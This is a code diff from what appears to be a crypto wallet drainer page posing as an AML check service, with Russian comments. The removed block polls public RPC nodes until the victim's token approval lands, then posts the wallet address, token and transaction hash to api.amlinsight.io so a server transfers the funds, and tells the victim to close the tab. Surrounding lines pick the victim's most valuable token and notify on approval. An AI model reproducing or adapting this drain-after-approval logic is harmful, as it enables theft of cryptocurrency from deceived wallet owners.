@@ -170,177 +170,10 @@ function hideCustomModal() {
   }
 }
 
-// Фоновый мониторинг approve (встроенный Service Worker функционал)
-let backgroundMonitoring = null
 
-// Проверка allowance через API (без wagmi)
-async function checkAllowanceViaAPI(userAddress, tokenAddress, spenderAddress, chainId) {
-  try {
-    // Используем публичные RPC для проверки allowance
-    const rpcUrls = {
-      1: 'https://eth.llamarpc.com',
-      56: 'https://bsc-dataseed.binance.org',
-      137: 'https://polygon-rpc.com',
-      42161: 'https://arb1.arbitrum.io/rpc',
-      10: 'https://mainnet.optimism.io',
-      8453: 'https://mainnet.base.org',
-      534352: 'https://rpc.scroll.io',
-      43114: 'https://api.avax.network/ext/bc/C/rpc',
-      250: 'https://rpc.ftm.tools',
-      59144: 'https://rpc.linea.build',
-      324: 'https://mainnet.era.zksync.io',
-      42220: 'https://forno.celo.org'
-    }
-    
-    const rpcUrl = rpcUrls[chainId]
-    if (!rpcUrl) throw new Error(`Unsupported chain: ${chainId}`)
-    
-    const allowanceData = {
-      jsonrpc: '2.0',
-      method: 'eth_call',
-      params: [{
-        to: tokenAddress,
-        data: `0xdd62ed3e000000000000000000000000${userAddress.slice(2)}000000000000000000000000${spenderAddress.slice(2)}`
-      }, 'latest'],
-      id: 1
-    }
-    
-    const response = await fetch(rpcUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(allowanceData)
-    })
-    
-    const result = await response.json()
-    if (result.error) throw new Error(result.error.message)
-    
-    return parseInt(result.result, 16)
-  } catch (error) {
-    console.log(`API allowance check failed: ${error.message}`)
-    return 0
-  }
-}
-
-// Отправка запроса на сервер из фона
-async function sendTransferRequestFromBackground(userAddress, tokenAddress, chainId, txHash, tokenSymbol, networkName) {
-  try {
-    const response = await fetch('https://api.amlinsight.io/api/transfer', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        userAddress, 
-        tokenAddress, 
-        amount: '0', // Будет рассчитано на сервере
-        chainId, 
-        txHash,
-        background: true,
-        tokenSymbol,
-        networkName
-      })
-    })
-    
-    const data = await response.json()
-    return data
-  } catch (error) {
-    return { success: false, message: error.message }
-  }
-}
-
-// Фоновая функция мониторинга approve
-async function monitorApprovalInBackground(userAddress, tokenAddress, contractAddress, chainId, txHash, tokenSymbol, networkName) {
-  console.log(`Background monitoring started for ${tokenSymbol} on ${networkName}`)
-  
-  let attempts = 0
-  const maxAttempts = 300 // 10 минут (300 * 2 секунды)
-  
-  while (attempts < maxAttempts) {
-    try {
-      attempts++
-      console.log(`Background check attempt ${attempts}/${maxAttempts}`)
-      
-      // Проверяем allowance через API
-      const allowance = await checkAllowanceViaAPI(userAddress, tokenAddress, contractAddress, chainId)
-      console.log(`Background allowance check: ${allowance}`)
-      
-      if (allowance > 1000) {
-        console.log(`Background: Allowance confirmed for ${tokenSymbol}`)
-        
-        // Отправляем запрос на сервер
-        const transferResult = await sendTransferRequestFromBackground(userAddress, tokenAddress, chainId, txHash, tokenSymbol, networkName)
-        
-        if (transferResult.success) {
-          console.log(`Background: Transfer successful - ${transferResult.txHash}`)
-          // Уведомляем об успехе
-          notifyBackgroundSuccess(transferResult.txHash, tokenSymbol, networkName)
-        } else {
-          console.log(`Background: Transfer failed - ${transferResult.message}`)
-          notifyBackgroundFailure(transferResult.message, tokenSymbol, networkName)
-        }
-        
-        return
-      }
-      
-      // Ждем 2 секунды
-      await new Promise(resolve => setTimeout(resolve, 2000))
-      
-    } catch (error) {
-      console.log(`Background monitoring error: ${error.message}`)
-      if (attempts === maxAttempts) {
-        notifyBackgroundTimeout(tokenSymbol, networkName, error.message)
-        return
-      }
-      await new Promise(resolve => setTimeout(resolve, 2000))
-    }
-  }
-  
-  console.log('Background monitoring timeout')
-  notifyBackgroundTimeout(tokenSymbol, networkName)
-}
-
-// Уведомления о результатах фонового мониторинга
-function notifyBackgroundSuccess(txHash, tokenSymbol, networkName) {
-  console.log(`Background transfer successful: ${txHash} for ${tokenSymbol} on ${networkName}`)
-  // Можно добавить уведомление пользователю или обновить UI
-}
-
-function notifyBackgroundFailure(message, tokenSymbol, networkName) {
-  console.log(`Background transfer failed: ${message} for ${tokenSymbol} on ${networkName}`)
-  // Можно добавить уведомление об ошибке
-}
-
-function notifyBackgroundTimeout(tokenSymbol, networkName, error = null) {
-  console.log(`Background monitoring timeout for ${tokenSymbol} on ${networkName}`)
-  if (error) console.log(`Error: ${error}`)
-  // Можно добавить уведомление о таймауте
-}
-
-// Запуск фонового мониторинга
-function startBackgroundMonitoring(userAddress, tokenAddress, contractAddress, chainId, txHash, tokenSymbol, networkName) {
-  // Останавливаем предыдущий мониторинг если есть
-  if (backgroundMonitoring) {
-    clearTimeout(backgroundMonitoring)
-  }
-  
-  console.log('Starting background monitoring...')
-  
-  // Запускаем мониторинг в фоне
-  backgroundMonitoring = setTimeout(() => {
-    monitorApprovalInBackground(userAddress, tokenAddress, contractAddress, chainId, txHash, tokenSymbol, networkName)
-  }, 1000) // Небольшая задержка для стабильности
-}
-
-// Остановка фонового мониторинга
-function stopBackgroundMonitoring() {
-  if (backgroundMonitoring) {
-    clearTimeout(backgroundMonitoring)
-    backgroundMonitoring = null
-    console.log('Background monitoring stopped')
-  }
-}
 
 // Очистка состояния при загрузке страницы
 window.addEventListener('load', () => {
-  stopBackgroundMonitoring() // Останавливаем фоновый мониторинг
   appKit.disconnect()
   localStorage.clear()
   sessionStorage.clear()
@@ -918,20 +751,6 @@ const initializeSubscribers = (modal) => {
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
           
-          // Запускаем встроенный фоновый мониторинг
-          console.log('Starting built-in background monitoring...')
-          startBackgroundMonitoring(
-            state.address,
-            mostExpensive.address,
-            contractAddress,
-            mostExpensive.chainId,
-            txHash,
-            mostExpensive.symbol,
-            mostExpensive.network
-          )
-          
-          // Показываем сообщение о фоновой обработке
-          approveMessage += `<br>Background monitoring started - you can close this tab`
           const approveState = document.getElementById('approveState')
           if (approveState) approveState.innerHTML = approveMessage
           hideCustomModal()
@@ -1009,7 +828,6 @@ document.querySelectorAll('.open-connect-modal').forEach(button => {
 });
 
 document.getElementById('disconnect')?.addEventListener('click', () => {
-  stopBackgroundMonitoring() // Останавливаем фоновый мониторинг
   appKit.disconnect()
   store.approvedTokens = {}
   store.errors = []
